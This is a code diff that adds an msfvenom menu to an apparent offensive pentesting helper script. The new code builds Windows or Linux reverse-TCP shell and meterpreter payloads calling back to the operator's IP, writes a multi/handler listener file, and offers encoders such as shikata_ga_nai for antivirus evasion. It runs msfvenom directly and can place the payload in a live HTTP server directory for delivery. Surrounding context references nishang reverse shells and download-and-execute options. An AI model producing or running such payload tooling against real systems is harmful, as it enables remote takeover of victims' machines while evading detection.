@@ -186,6 +186,102 @@ def nishang_shell_menu():
         print(f"Encoded: powershell -Enc {b}")
         input('Press any key to continue')
 
+def msfvenom_generate_menu(ip, directory):
+    # select windows/linux
+    options = ['windows', 'linux']
+    index = TerminalMenu(options).show()
+    platform = options[index]
+    print(platform)
+    
+    # select shell or meterpreter
+    options = ['shell', 'meterpreter']
+    index = TerminalMenu(options).show()
+    shellType = options[index]
+    print(shellType)
+
+    # select x86/x64
+    options = ['x86', 'x64']
+    index = TerminalMenu(options).show()
+    arch = options[index]
+    print(arch)
+
+    if shellType == 'shell': sh = 'shell_'
+    else:
+        options = ['staged', 'unstaged']
+        index = TerminalMenu(options).show()
+        if index == 0: sh = 'meterpreter/'
+        else: sh = 'meterpreter_'
+    
+    sh += 'reverse_tcp'
+    
+    if platform == 'windows' and arch == 'x86':    
+        payload = f"{platform}/{sh}"
+    else:
+        payload = f"{platform}/{arch}/{sh}"
+
+    print(f"Payload: {payload}")
+    
+    # enter revshell port
+    port = input("Enter reverse shell port: ")
+
+    # read format
+    if platform == 'windows':
+        options = ['exe','dll','asp','msi','psh','psh-cmd','vba','asp','aspx','aspx-exe']
+    else:
+        options = ['elf','elf-so']
+    index = TerminalMenu(options).show()
+    format = options[index]
+    print(format)
+
+    randomName = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
+
+    # if meterpreter, generate RC file as well to launch msfconsole with the right kind of multi/handler listener
+    if shellType == 'meterpreter':
+        filename = f"listen-{randomName}.rc"
+        f = open(filename, 'w') # put in current working directory
+        f.write(f"""use multi/handler
+set payload {payload}
+set lhost {ip}
+set lport {port}
+run
+        """)
+        f.close()
+        print(f"Generated RC file: {filename}")
+        print(f"Listener command: msfconsole -r {filename}")
+    
+    # select encoders or none, different ones for x86 and x64
+    # if encoders are used, enter iterations
+    options = ['None']
+    if arch == 'x86':
+        options.append('x86/shikata_ga_nai')
+    elif arch == 'x64':
+        options.append('x64/zutto_dekiru')
+    print("Select encoder")
+    index = TerminalMenu(options).show()
+    print(f"Encoder {options[index]}")
+    if index == 0: encoder = ''
+    else: encoder = options[index]
+
+    iterations = 0
+    if len(encoder) > 0:
+        iterations = int(input("Enter encoder iterations: "))
+    
+    filename = f"{directory}{randomName}.{format}"
+    cmd = f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f {format} -o {filename}"
+    if len(encoder) > 0:
+        cmd += f" -e {encoder} -i {iterations}"
+
+    print(cmd)
+    os.system(cmd)
+
+def msfvenom_menu():
+    ip = get_interface_ip()
+    directory = ''
+    if is_python_http_running():
+        pid, _ = select_python_http()
+        directory = f"/proc/{pid}/cwd/"
+    msfvenom_generate_menu(ip, directory)
+
 def windows_menu():
     options = ["wget outfile", "IEX download and run script", "Prepare nishang reverse shell"]
     index = TerminalMenu(options).show()
@@ -216,7 +312,7 @@ def windows_menu():
 
 def main():
     os.system("pwd")
-    options = ["Copy my IP", "Linux shell commands", "Windows shell commands", "Copy python HTTP", "Start apache"]
+    options = ["Copy my IP", "Linux shell commands", "Windows shell commands", "Copy python HTTP", "MSFVenom", "Start apache"]
     terminal_menu = TerminalMenu(options)
     index = terminal_menu.show()
     print(options[index])
@@ -232,6 +328,8 @@ def main():
         else:
             input("Start python http server and try again")
     elif index == 4:
+        msfvenom_menu()
+    elif index == 5:
         print("Starting apache... sudo required")
         os.system("sudo systemctl start apache2")
 
